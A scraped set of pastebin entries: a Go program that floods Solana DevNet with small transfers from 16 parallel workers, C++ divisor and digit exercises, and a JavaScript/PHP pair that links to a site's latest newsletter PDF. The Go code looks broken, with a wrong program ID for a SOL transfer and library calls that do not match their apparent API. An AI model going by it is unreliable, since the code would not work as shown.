WagKDpC5,Untitled,rand17,Go,Saturday 16th of March 2024 08:25:08 AM CDT,"package main

import (
	""context""
	""fmt""
	""log""
	""sync""
	""time""

	""github.com/gagliardetto/solana-go""
	""github.com/gagliardetto/solana-go/rpc""
	""github.com/gagliardetto/solana-go/types""
)

func sendTransaction(sender *solana.Wallet, receiver solana.PublicKey, client *rpc.Client) {
	// Define the amount to send in lamports (0.001 SOL):
	amount := uint64(0.001 * 1e9)

	// Create a transfer instruction:
	instruction := solana.NewTransferInstruction(
		solana.TokenProgramID,
		sender.PublicKey(),
		receiver,
		amount,
	).Build()

	// Create a message for the transaction:
	message := types.NewMessage(
		types.NewMessageParam{
			FeePayer:        sender.PublicKey(),
			Instructions:    []types.Instruction{instruction},
			RecentBlockhash: client.GetRecentBlockhash(context.Background()), // Get recent blockhash
		},
	)

	// Sign the transaction:
	tx, err := types.NewTransaction(
		*message,
		[]*solana.Wallet{sender},
	)
	if err != nil {
		log.Printf(""Failed to create transaction: %v"", err)
		return
	}

	// Send the transaction:
	_, err = client.SendTransaction(context.Background(), tx)
	if err != nil {
		log.Printf(""Failed to send transaction: %v"", err)
	}
}

func worker(ctx context.Context, workerID int, sender *solana.Wallet, receiver solana.PublicKey, client *rpc.Client) {
	for {
		select {
		case <-ctx.Done():
			fmt.Printf(""Worker %d done\n"", workerID)
			return
		default:
			sendTransaction(sender, receiver, client)
			fmt.Printf(""Worker %d sent a transaction\n"", workerID)
			// A brief pause to prevent spamming, adjust as necessary based on actual testing and rate limits
			time.Sleep(100 * time.Millisecond)
		}
	}
}

func main() {
	// Initialize RPC client (adjust as needed):
	client := rpc.New(rpc.DevNet_RPC) // Use DevNet for testing

	// Your wallet setup:
	senderPrivateKey := []byte(""YourSenderPrivateKeyHere"")
	sender := solana.NewWalletFromPrivateKeyBytes(senderPrivateKey)
	receiver := solana.MustPublicKeyFromBase58(""YourReceiverPublicKeyHere"")

	// Context to handle the 10-second duration:
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	var wg sync.WaitGroup

	// Launching 16 workers:
	for i := 0; i < 16; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()
			worker(ctx, workerID, sender, receiver, client)
		}(i)
	}

	// Wait for all workers to complete:
	wg.Wait()
}
"
D1zrBtb8,Untitled,Josif_tepe,C++,Saturday 16th of March 2024 08:13:58 AM CDT,"#include <bits/stdc++.h>
using namespace std;
int main()
{
    ios_base::sync_with_stdio(false);
    int a, b;
    cin >> a >> b;

    int koren = sqrt(a);
    int res = 0;
    for(int i = 1; i <= koren; i++) {
        if(a % i == 0) {
            if(b % i == 0) {
                res++;
            }
            int d = a / i;
            if(b % d == 0 and i != d) {
                res++;
            }
        }
    }
    cout << res << endl;
    return 0;
}
"
8Vce5nZa,Untitled,BojidarDosev,C++,Saturday 16th of March 2024 08:07:30 AM CDT,"#include <iostream>
#include <vector>
#include <string>
#include <cmath>
#include <algorithm>

using namespace std;

int main()
{
    int num, num1, num2;
    vector <int> nums = {};
    cout << ""Enter a number between 1000 and 9999: "";
    cin >> num;
    cout << endl;

    if (num < 1000 || num > 9999)
    {
        cerr << ""Invalid input, try again!"" << endl;
        return 1;
    }

    cout << ""num1 = "";
    num1 = num % 10 + num / 1000 *10;
    cout << num1 << endl;

    cout << ""num2 = "";
    num2 = num/10%10 + num / 100 % 10 *10;
    cout << num2 << endl;
    
    if (num1 > num2)
    {
        cout << ""num1 > num2"";
    }
    else if (num1 < num2)
    {
        cout << ""num1 < num2"";
    }
    else
    {
        cout << ""num1 == num2"";
    }
}

/*
Да се състави програма, чрез която се въвежда 4 - цифренo естествено число от интервала[1000.. 9999].От това число се формират 2 нови 2 - цифрени числа.
Първото число се формира от 1 - та и 4 - та цифра на въведеното число.
Второто число се формира от 2 - рa - 3 - та цифра на въведеното число.
На екрана да се изведе дали 1 - то ново число e по - малко < , равно = или по - голямо от 2 - то число.
*/"
fi5GZM3p,newsletter.js,acclivity,JavaScript,Saturday 16th of March 2024 08:06:50 AM CDT,"		<script>
        document.getElementById('latestNewsletterButton').addEventListener('click', function(event) {
            event.preventDefault(); 	// Prevent default action of the link
			// Make an AJAX request to fetch the latest newsletter link
            var xhr = new XMLHttpRequest();
            xhr.onreadystatechange = function() {
                if (xhr.readyState === XMLHttpRequest.DONE) {
                    if (xhr.status === 200) {
						var latestNewsletterLink = xhr.responseText;
						// If request is successful, trigger the link
                        window.location.href = latestNewsletterLink;
                        // If request is successful, display the link
						
                    } else {
                        // If request fails, display an error message
						alert('Failed to fetch latest newsletter.');
                    }
                }
            };
            xhr.open('GET', 'LatestNewsletter.php', true);
            xhr.send();
        });
		</script>"
W6hb95Rd,Untitled,Josif_tepe,C++,Saturday 16th of March 2024 08:03:57 AM CDT,"#include <bits/stdc++.h>
using namespace std;
int main()
{
    ios_base::sync_with_stdio(false);

    int a, b;
    cin >> a >> b;
    int res = 0;
    while(a != b) {
        if(a > b) {
            swap(a, b);
        }
        int najgolem_delitel = 1;
        int koren = sqrt(a);

        for(int i = 2; i <= koren; i++) {
            if(a % i == 0) {
                najgolem_delitel = a / i;
                break;
            }
        }
        int razlika = b - a;
        int kolku_pati = razlika / najgolem_delitel;
        if(razlika % najgolem_delitel > 0) {
            kolku_pati++;
        }
        b -= najgolem_delitel * kolku_pati;
        res += kolku_pati;
    }

    cout << res << endl;
    return 0;
}
"
CtqgL4CA,Find-Latest-Newsletter.PHP,acclivity,PHP,Saturday 16th of March 2024 08:00:56 AM CDT,"<?php
// ""LatestNewsletter.php""

// Within the folder media/news, there are sub-folders for each volume (year) of newsletter
// These are named V1, V2, V3 etc.
// Within each Volume folder, there are newsletters named VnNn.pdf, e.g, V3N1.pdf, V3N2.pdf etc. for volume 3
// This code finds the most recent newsletter for the current year, given that Volume 1 was year 2020

// Determine the current year
$currentYear = date('Y');

// Determine the volume based on the current year
$volume = 'V' . ($currentYear - 2019); 	// Assuming volume 1 corresponds to year 2020

// Set the base directory where newsletters for the current year are stored
$newsletterDirectory = 'media/news/' . $volume . ""/"";

// Initialize variables to keep track of the latest newsletter found
$latestNewsletter = '';
$newsletterNumber = 1;

// Loop through each newsletter for the current volume until it fails to find one
while (file_exists($newsletterDirectory . $volume . 'N' . $newsletterNumber . '.pdf')) {
    $latestNewsletter = $volume . 'N' . $newsletterNumber . '.pdf';
    $newsletterNumber++;
}

// If no newsletters were found, send an error message
if (empty($latestNewsletter)) {
    echo 'No newsletters found for volume ' . $volume . '.    ' . $newsletterDirectory . ""    "" . $newsletterNumber;
} else {
    // Generate the link to the latest newsletter
    $latestNewsletterLink = $newsletterDirectory . $latestNewsletter;
    // Send the link to the front-end code
	echo $latestNewsletterLink;
}
?>"
rXb8pXNs,Untitled,Josif_tepe,C++,Saturday 16th of March 2024 07:56:01 AM CDT,"#include <bits/stdc++.h>
using namespace std;
int main()
{
    ios_base::sync_with_stdio(false);

    int a, b;
    cin >> a >> b;
    int res = 0;
    while(a != b) {
        if(a > b) {
            swap(a, b);
        }
        int najgolem_delitel = 1;
        int koren = sqrt(a);

        for(int i = 2; i <= koren; i++) {
            if(a % i == 0) {
                najgolem_delitel = a / i;
                break;
            }
        }
        b -= najgolem_delitel;
        res++;
    }

    cout << res << endl;
    return 0;
}
"
